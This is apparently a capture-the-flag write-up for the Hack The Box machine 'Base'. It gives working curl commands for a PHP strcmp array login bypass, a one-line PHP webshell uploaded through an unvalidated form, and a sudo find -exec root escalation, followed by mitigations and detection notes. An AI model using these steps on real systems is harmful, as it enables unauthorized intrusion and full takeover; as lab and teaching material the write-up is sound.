---
machine: Base
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, type-juggling, upload, sudo, tier2]
---

# Base — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

`login.php` calls `strcmp()` with arrays: sending `username[]=admin` makes the comparison return `0` and the login is bypassed. An unvalidated `upload.php` gives a webshell, `/etc/passwd` reveals the user `john` and his password is reused over SSH. `sudo find` finishes as root.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp open ssh  OpenSSH 8.2p1 Ubuntu
80/tcp open http Apache httpd 2.4.41 (Ubuntu)
```

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
/login/login.php
/login.php.swp
/upload.php
/config.php
```

The Vim `.swp` file is recoverable: it holds `login.php`'s source and confirms `strcmp`.

## Foothold

```bash
curl -s -X POST http://<TARGET_IP>/login/login.php \
  -d 'username[]=admin&password[]=x'
```

`strcmp(array, string)` returns `NULL`/`0` and PHP treats it as a match → logged in. The panel redirects to `upload.php`, which accepts any file:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -s -b 'PHPSESSID=<SESSION>' -F 'file=@shell.php' http://<TARGET_IP>/upload.php
curl -s "http://<TARGET_IP>/uploads/shell.php?c=id"
```

## Lateral movement

```bash
curl -s "http://<TARGET_IP>/uploads/shell.php?c=cat+/etc/passwd"
```

The listing shows `john`; his password sits in `config.php` and is reused for SSH:

```bash
ssh john@<TARGET_IP>
```

## Privilege escalation

```bash
sudo -l
# (root) /usr/bin/find
sudo /usr/bin/find /bin -exec /bin/bash \;
```

```text
# id
uid=0(root)
# cat /root/root.txt
```

## Evidence

- Request with `username[]` and the authenticated panel.
- `sudo -l` with the `find` rule and a root shell.

## Lessons learned

- `strcmp` with non-string types is a classic bypass: arrays break the comparison.
- A forgotten `.swp` file is the same as publishing the source.
- Uploads without extension or execution checks → webshell.
- `find` with `-exec` under `sudo` is root; so are `less`, `awk`, `nano`.

## Mitigations and detection

- Compare with `hash_equals()` and strict typing (`declare(strict_types=1)`).
- Validate that parameters are scalars before use.
- Uploads outside the webroot, renamed, non-executable; check the real MIME type.
- No `find`/editors/pagers in `sudo`; use `sudoedit` with allowlists.
- Detection: `username[]` in POST bodies, reachable `.swp` files, `find -exec` with `bash` in `auth.log`.

- CWE-843 Type Confusion, CWE-434, CWE-250
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/)

## References

- [OWASP — PHP type juggling](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
